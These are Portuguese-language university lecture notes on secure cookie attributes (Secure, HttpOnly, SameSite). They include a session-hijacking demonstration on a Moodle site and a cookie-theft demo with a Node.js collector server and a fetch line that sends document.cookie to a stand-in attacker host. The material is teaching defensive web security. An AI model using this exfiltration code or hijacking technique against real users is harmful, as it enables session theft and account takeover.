Devido aos *cookies* poderem ser usados para identificar uma sessão autenticada do utilizador e suas informações e preferências pessoais, é fundamental que sites manipulem seus *cookies* de maneira correta e segura. Em grande parte, isto é alcançado através da configuração apropriada de determinadas propriedades dos *cookies*.

Além das propriedades `Path` e `Domain` já mencionadas, outras propriedades relevantes incluem:

- `Secure`: quando definida, solicita ao *browser* que só inclua o *cookie* em requisições enviadas via HTTPS. Isto impede que *cookies* com informações sensíveis, como identificadores de sessão, sejam transmitidos em texto plano e também evita a hipótese de um atacante obter o valor de *cookies* passando-se pelo servidor legítimo.
- `HttpOnly`: este atributo define que o *cookie* não pode ser modificado através de Javascript. O código Javascript de uma página pode manipular os *cookies* da mesma através do objeto `document.cookie`. Esta propriedade evita que *scripts* maliciosos façam alterações nos valores dos *cookies* ou leiam os valores dos *cookies* e os envie para um servidor remoto.
- `SameSite`: esta propriedade limita os casos nos quais *cookies* são enviados em requisições *cross-site*. Uma requisição *cross-site* ocorre quando a página de um site faz referência a objetos de outro site/domínio. Configurar de maneira adequada esta propriedade pode evitar um ataque conhecido como *Cross-Site Request Forgery*, que será estudado em mais detalhes em aulas futuras.

É importante, ainda, sabermos como uma aplicação pode apagar um *cookie* (por exemplo, para sinalizar a finalização de uma sessão). Para isto, pode-se explorar a propriedade de data de expiração: a aplicação servidora pode simplesmente incluir um *header* `Set-Cookie` que defina um *cookie* com o mesmo nome, mas uma data de expiração passada.

> [!NOTE]
>
> Ilustração da importância da manipulação segura de *cookies*.
>
> O valor de um *cookie* definido por um servidor para um dado cliente frequentemente deve permanecer confidencial. Um exemplo disto são os *cookies* de sessão, particularmente aqueles associados a sessões autenticadas entre cliente e servidor.
>
> Para ilustrarmos isto, voltemos à demonstração que envolvia o acesso à plataforma Moodle do ISEL. Particularmente, iremos analisar as consequências de um eventual atacante obter o valor do *cookie* de sessão utilizado pela página. Para isto, considere os seguintes passos:
> - Inicialmente, abra uma janela normal (*i.e.*, que não seja em modo anónimo) de um *browser*. A título de exemplo, assumiremos aqui o uso do Firefox, embora qualquer outro *browser* possa ser utilizado.
> - Nesta janela normal, aceda ao Moodle do ISEL em https://2425moodle.isel.pt/. Se ainda não estiver autenticado, autentique-se com a sua conta.
> - Uma vez autenticado, deve-se ter acesso a todos os conteúdos personalizados ao utilizador em questão. Por exemplo, se tentarmos aceder ao endereço https://2425moodle.isel.pt/my, obteremos a página inicial do utilizador, que lista suas disciplinas e outras informações pessoais.
> - Agora abra uma nova janela anónima e tente aceder a https://2425moodle.isel.pt/my. Esta requisição resultará num redirecionamento para uma página de *login*. Isto ocorre porque esta janela anónima não possuia *cookies* previamente armazenados para esta página, fazendo com que o servidor a identifique como uma nova sessão não autenticada. Ao tentarmos aceder a um recurso protegido, o servidor solicita uma autenticação.
> - Volte agora à janela em modo normal e aceda aos *Web Development Tools*, particularmente à aba *Storage*. Esta aba mostra vários tipos de dados que o *browser* armazena relativos ao site atualmente visualizado. No quadro à esquerda, encontramos uma entrada denominada *cookies*. Se carregarmos nesta entrada -- particularmente em `https://2425moodle.isel.pt` -- veremos a lista de *cookies* atualmente definidos para este site. Em particular, deve haver um *cookie* denominado `MoodleSession`. Podemos aceder à célula que armazena o seu valor e copiá-lo.
> - Agora, volte à janela anónima e, através do *Web Development Tools*, visualize os *cookies* lá definidos. Aqui, também, deve haver um *cookie* `MoodleSession`, mas com valor diferente daquele da janela normal. Se fizermos carregarmos sobre a célula *value*, podemos editar o seu valor e, particularmente, modificá-lo para o valor do *cookie* da janela normal.
> - Feito isto, tente novamente aceder a https://2425moodle.isel.pt/my na janela anónima: agora, ao invés de sermos redirecionados para a página de *login*, recebemos a página principal do utilizador, com todas as informações que lhe são pessoais, exatamente como se tivéssemos feito *login* com aquele utilizador.
>
> O processo descrito acima emula um tipo de ataque conhecido como **Sequestro de Sessão**. Aqui, o atacante corresponderia à janela anónima, que não se encontra inicialmente autenticada. Mas, se de alguma forma, o atacante consegue obter o valor do *cookie* de sessão do *browser* de um utilizador previamente autenticado, ele pode simplesmente configurar os *cookies* do seu próprio *browser* fazendo-se passar pelo utilizador legítimo para o servidor.
>
> Isto ilustra a importância das configurações apropriadas de segurança dos *cookies*, como a opção `Secure`.


> [!NOTE]
>
> Ilustração da importância da opção `httpOnly`.
>
> Sem a opção `httpOnly`, qualquer script *javascript* que corre numa página pode aceder aos *cookies* definidos pelo respetivo servidor. Embora isto possa não parecer um problema de segurança, dado tratar-se de um script da própria página, suponha que, de alguma forma, um atacante consiga inserir um código *javascript* malicioso numa página (*e.g.*, o atacante fornece alguma biblioteca potencialmente útil àquela página, mas inclui trechos de código maliciosos). Vamos ilustrar o que este código malicioso pode realizar, utilizando para isto a consola do *Web Developer Tools*:
> - Comece por aceder a algum site que utiliza *cookies*. Particularmente, procure por algum que defina *cookies* **sem a opção** `httpOnly`.
> - Uma vez neste site, carregue a consola do *Web Developer Tools*. Utilizaremos esta consola para emular o que o código do atacante poderia fazer. 
> - Como um primeiro passo, podemos mostrar os valores dos *cookies*:
> ```javascript
> console.log(document.cookie)
> ```
> - Como resultado, devemos ver os *cookies* e seus valores na consola.
> - Agora suponha que o atacante tenha configurado um simples servidor para receber os valores dos *cookies*. Em *nodejs*, por exemplo, podemos criar um servidor da seguinte forma:
> ```node
> const express = require("express");
> var cors = require('cors')
> 
> const PORT = 8080;
> const app = express();
> 
> var cookieList = [];
> 
> app.use(cors())
> 
> app.get("/cookies", function (req, res) {
> 
>     cookieList.push(req.query);
>     console.log("Just logged a new set of cookies from "
>         + req.socket.remoteAddress
>         + '. Values: ');
>     console.log(req.query);
>     
>     res.send("");
> });
> 
> app.listen(PORT, () => {
> 
>     console.log(`Example app listening on port ${PORT}`)
> })
> ```
> - O que este servidor faz é simplesmente criar um recurso denominado `/cookies` e registar os parâmetros da requisição num *array* (além de imprimi-los na consola).
> - De volta ao código *javascript* malicioso (a consola *Web Developer Tools*), o atacante pode enviar o valor dos *cookies* facilmente ao seu próprio servidor:
> ```javascript
> fetch("http://servidormalicioso.com/?" + document.cookie)
> ```
> - Como consequência, devemos ver os valores dos *cookies* da página carregada no *browser* impressos na consola do servidor *nodejs*.
>
> Note que é comum que servidores definam certos *cookies* sem a opção `httpOnly`. Isto não é necessariamente um problema de segurança, desde que a confidencialidade do valor do *cookie* não seja essencial.


